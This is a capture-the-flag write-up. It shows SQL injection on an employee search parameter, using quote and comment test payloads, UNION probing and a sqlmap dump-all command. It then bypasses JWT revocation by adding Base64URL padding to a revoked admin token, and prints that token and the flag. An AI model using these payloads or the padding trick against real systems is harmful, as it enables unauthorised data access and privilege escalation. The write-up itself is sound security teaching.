## 3️⃣ Finding the Injection Point

On `/employees`, there was a search bar issuing the request:

GET /employees?query=<input>


### First test
GET /employees?query='


Resulted in a **500 Internal Server Error**, confirming a backend SQL error.

![Desktop View](/assets/heroctf/image6.png){: width="700" height="400" .normal }

---

### Second test
GET /employees?query=' --


Returned **200 OK**, meaning the query became syntactically valid.

![Desktop View](/assets/heroctf/image7.png){: width="700" height="400" .normal }

✅ SQL injection confirmed on the `query` parameter.

---

## 4️⃣ Manual SQLi Testing

I sent the request to **Burp Intruder** and started testing UNION-based payloads.

### Column count discovery

Through incremental UNION tests, I confirmed the query had **4 columns**.

![Desktop View](/assets/heroctf/image8.png){: width="700" height="400" .normal }

### Data type testing

All columns accepted string values, meaning `'text'` could be injected safely.

![Desktop View](/assets/heroctf/image9.png){: width="700" height="400" .normal }

At this stage, dumping the database manually was possible — but automation was faster.

## 5️⃣ Automating with SQLMap

I saved the vulnerable request (including the JWT cookie) into `req.txt` and ran:

```bash
sqlmap -r req.txt -p query --dbms=SQLite --dbs --batch --tables --dump-all
```


SQLMap identified three tables, one of which contained credentials.

##  Revoked Revenge Challenge

![Desktop View](/assets/heroctf/image20.png){: width="700" height="400" .normal }

🧠 Overview
This challenge looked almost identical — same /employees page, same SQL injection.

However, after dumping the database, a suspicious table appeared:

revoked_tokens


🔐 JWT Analysis
I extracted the admin JWT and decoded it using jwt.io.

```shell
Header
{
  "alg": "HS256",
  "typ": "JWT"
}
Payload
{
  "username": "admin",
  "is_admin": 1,
  "issued": 1764597744.384469
}
```

Everything looked valid — but admin access was denied.

I tried all classic attacks:

Modifying is_admin

alg: none

Cracking HS256 secret

Nothing worked.

💡 The Revocation Bypass
The admin token signature appeared in the revoked_tokens table:

V7RNjlnwqGAnSLl6sbG4MS1uOM45fAUp3a2khurJ-1E
After digging deeper, I realized the revocation system was comparing raw Base64URL strings.

Key insight:
Base64URL padding (=) is optional

Adding == does not change decoded bytes

Signature verification still passes

Result:
Original token → blocked

Token + == → bypasses revocation

✅ Working Admin Token
```shell
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlzc3VlZCI6MTc2NDU5Nzc0NC4zODQ0Njl9.V7RNjlnwqGAnSLl6sbG4MS1uOM45fAUp3a2khurJ-1E==
```

Used it → instant admin access.



🚩 Final Flag
```shell
Hero{N0t_th4t_r3v0k3d_37d75e49a6578b66652eca1cfe080e5b}
```

🧠 Takeaway
Never store raw JWT signatures for revocation.

✔ Always normalize
✔ Or hash decoded signature bytes
❌ Never compare raw Base64URL strings

This padding trick is a killer bypass when revocation is implemented sloppily.
